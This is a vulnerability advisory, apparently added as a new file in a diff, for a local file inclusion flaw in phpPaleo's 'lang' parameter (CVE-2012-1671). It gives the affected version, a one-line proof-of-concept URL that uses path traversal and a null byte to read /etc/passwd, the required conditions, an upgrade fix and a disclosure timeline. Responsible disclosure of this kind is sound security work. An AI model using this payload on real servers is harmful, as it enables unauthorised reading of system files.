@@ -1,0 +1,40 @@
+'phpPaleo' Local File Inclusion (CVE-2012-1671)
+Mark Stanislav - mark.stanislav@gmail.com
+
+
+I. DESCRIPTION
+---------------------------------------
+A vulnerability exists in index.php for language handling that allows for local file inclusion using a null-byte attack on the 'lang' GET parameter.
+
+ 
+II. TESTED VERSION
+---------------------------------------
+4.8b156
+
+
+III. PoC EXPLOIT
+---------------------------------------
+http://localhost/phppaleo/index.php?lang=../../../../../../../etc/passwd%00
+
+
+IV. NOTES 
+---------------------------------------
+* magic_quotes_gpc must be disabled and PHP must be < 5.3.4 for null-byte attacks to work
+
+
+V. SOLUTION
+---------------------------------------
+Upgrade to 4.8b157 or above.
+
+
+VI. REFERENCES
+---------------------------------------
+http://sourceforge.net/projects/phppaleo/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1671
+
+
+VII. TIMELINE
+---------------------------------------
+03/01/2012 - Initial vendor disclosure
+03/02/2012 - Vendor patched and released an updated version
+04/04/2012 - Public disclosure
